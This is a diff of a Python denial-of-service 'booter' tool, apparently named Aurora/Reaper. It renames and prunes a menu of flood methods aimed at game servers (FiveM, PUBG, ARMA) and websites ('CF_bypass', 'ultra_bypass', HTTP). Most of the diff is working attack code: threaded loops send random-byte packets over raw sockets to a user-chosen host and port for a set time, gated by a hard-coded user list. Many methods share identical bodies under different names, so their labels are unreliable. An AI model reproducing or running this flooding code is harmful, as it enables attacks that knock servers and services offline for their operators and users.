@@ -25,14 +25,14 @@ methods = """\033[91m
 ║                        ║ ║                        ║ ║                         ║
 ╚════════════════════════╝ ╚════════════════════════╝ ╚═════════════════════════╝
 ╔═══════════════════════════════════════════════════╗
-          𝒢𝒜𝑀𝐸                        Layer 7                                                     
+          𝒢𝒜𝑀𝐸                      Layer 7                                                     
 ╚═══════════════════════════════════════════════════╝
-║         ARMA           ║ ║           HTTP         ║                                                  
-║       GAME-DROP        ║ ║           SYS          ║                         
-║       FIVEM-GAME       ║ ║       ultra_bypass     ║                
-║       PUBG-GAME        ║ ║        CF_bypass       ║       
-║       FIVEM-SERVER     ║ ║          httpK         ║ 
-╚════════════════════════╝ ╚════════════════════════╝ 
+║         ARMA           ║ ║          HTTP          ║                                                  
+║       GameDrop         ║ ║          httpK         ║                             
+║       FiveMGame        ║ ║       UltraBypass      ║                
+║       FiveMServer      ║ ║        CFBypass        ║       
+║       PubGGame         ║ ╚════════════════════════╝    
+╚════════════════════════╝  
 """
 
 info = """\033[91m
@@ -720,7 +720,7 @@ def DEMOv2sender(host, port, timer, punch):
 	aid -= 1
 
 
-def game_drop(host, port, timer, punch):
+def gamedropsender(host, port, timer, punch):
 
 	global iaid
 
@@ -753,7 +753,7 @@ def game_drop(host, port, timer, punch):
 	aid -= 1
 	
 
-def FIVEM_GAME(host, port, timer, punch):
+def FIVEMGAMEsender(host, port, timer, punch):
 
 	global iaid
 
@@ -786,7 +786,7 @@ def FIVEM_GAME(host, port, timer, punch):
 	aid -= 1
 
 
-def FIVEM_SERVER(host, port, timer, punch):
+def FIVEMSERVERsender(host, port, timer, punch):
 
 	global iaid
 
@@ -819,7 +819,7 @@ def FIVEM_SERVER(host, port, timer, punch):
 	aid -= 1
 
 
-def PUBG_GAME(host, port, timer, punch):
+def PUBGGAMEsender(host, port, timer, punch):
 
 	global iaid
 
@@ -850,176 +850,143 @@ def PUBG_GAME(host, port, timer, punch):
 	iaid -= 1
 
 	aid -= 1
-
-
-def http(host, port, timer, punch):
-
-	global iaid
-
-	global icmp
-
-	global aid
-
-	global tattacks
-
-
-
-	timeout = time.time() + float(timer)
-
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-
-
-	iaid += 1
-
-	aid += 1
-
-	tattacks += 1
-
-	while time.time() < timeout and icmp and attack:
-
-		sock.sendto(punch, (host, int(port)))
-
-	iaid -= 1
-
-	aid -= 1
-
-
-def sys(host, port, timer, punch):
-
-	global iaid
-
-	global icmp
-
-	global aid
-
-	global tattacks
-
-
-
-	timeout = time.time() + float(timer)
-
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-
-
-	iaid += 1
-
-	aid += 1
-
-	tattacks += 1
-
-	while time.time() < timeout and icmp and attack:
-
-		sock.sendto(punch, (host, int(port)))
-
-	iaid -= 1
-
-	aid -= 1
-
-
-def ultra_bypass(host, port, timer, punch):
-
-	global iaid
-
-	global icmp
-
-	global aid
-
-	global tattacks
-
-
-
-	timeout = time.time() + float(timer)
-
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-
-
-	iaid += 1
-
-	aid += 1
-
-	tattacks += 1
-
-	while time.time() < timeout and icmp and attack:
-
-		sock.sendto(punch, (host, int(port)))
-
-	iaid -= 1
-
-	aid -= 1
-
-
-def cf_bypass(host, port, timer, punch):
-
-	global iaid
-
-	global icmp
-
-	global aid
-
-	global tattacks
-
-
-
-	timeout = time.time() + float(timer)
-
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-
-
-	iaid += 1
-
-	aid += 1
-
-	tattacks += 1
-
-	while time.time() < timeout and icmp and attack:
-
-		sock.sendto(punch, (host, int(port)))
-
-	iaid -= 1
-
-	aid -= 1
-
-
-def httpK(host, port, timer, punch):
-
-	global iaid
-
-	global icmp
-
-	global aid
-
-	global tattacks
-
-
-
-	timeout = time.time() + float(timer)
-
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-
-
-	iaid += 1
-
-	aid += 1
-
-	tattacks += 1
-
-	while time.time() < timeout and icmp and attack:
-
-		sock.sendto(punch, (host, int(port)))
-
-	iaid -= 1
-
-	aid -= 1
-
-
 
 
 def httpsender(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def ultrabypasssender(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def cfbypasssender(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+def httpKsender(host, port, timer, punch):
+
+	global iaid
+
+	global icmp
+
+	global aid
+
+	global tattacks
+
+
+
+	timeout = time.time() + float(timer)
+
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+
+
+	iaid += 1
+
+	aid += 1
+
+	tattacks += 1
+
+	while time.time() < timeout and icmp and attack:
+
+		sock.sendto(punch, (host, int(port)))
+
+	iaid -= 1
+
+	aid -= 1
+
+
+
+
+def httpsendersender(host, port, timer, punch):
 
 	global haid
 
@@ -1126,7 +1093,7 @@ def main():
 			print (help)
 
 			main()
-		
+
 		elif sinput == "extras":
 
 			os.system ("clear")
@@ -1247,7 +1214,7 @@ def main():
 
 					main()
 					
-		elif sinput == "GAME_DROP":
+		elif sinput == "gamedrop":
 			
 			if username == "walker":
 
@@ -1280,7 +1247,7 @@ def main():
 
 					main()
 					
-		elif sinput == "FIVEM_GAME":
+		elif sinput == "fivemgame":
 			
 			if username == "walker":
 
@@ -1313,7 +1280,7 @@ def main():
 
 					main()
 					
-		elif sinput == "FIVEM_SERVER":
+		elif sinput == "fivemserver":
 			
 			if username == "walker":
 
@@ -1346,7 +1313,7 @@ def main():
 
 					main()
 					
-		elif sinput == "PUBG_GAME":
+		elif sinput == "pubggame":
 			
 			if username == "walker":
 
@@ -1412,39 +1379,7 @@ def main():
 
 					main()
 					
-		elif sinput == "sys":
-			
-			if username == "walker":
-
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
-
-				main()    
-			else:
-				try:
-
-					sinput, host, port, timer, pack = sin.split(" ")
-
-					socket.gethostbyname(host)
-
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
-
-					punch = random._urandom(int(pack))
-
-					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
-
-				except ValueError:
-
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-
-					main()
-
-				except socket.gaierror:
-
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
-
-					main()
-					
-		elif sinput == "ultra_bypass":
+		elif sinput == "ultrabypass":
 			
 			if username == "walker":
 
@@ -1477,14 +1412,15 @@ def main():
 
 					main()
 					
-		elif sinput == "CF_bypass":
-
+		elif sinput == "cfbypass":
+			
 			if username == "walker":
 
 				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
+
 				try:
 
 					sinput, host, port, timer, pack = sin.split(" ")
@@ -1509,7 +1445,7 @@ def main():
 
 					main()
 					
-		elif sinput == "httpK":
+		elif sinput == "httpk":
 			
 			if username == "walker":
 
@@ -2234,8 +2170,6 @@ def main():
 			print ("[\033[91mReaper\033[00m] {} Is Not A Command.\n".format(sinput))
 
 			main()
-
-
 
 try:
 	users = ["Reaper", "Guest", "zode", "mort", "walker"]
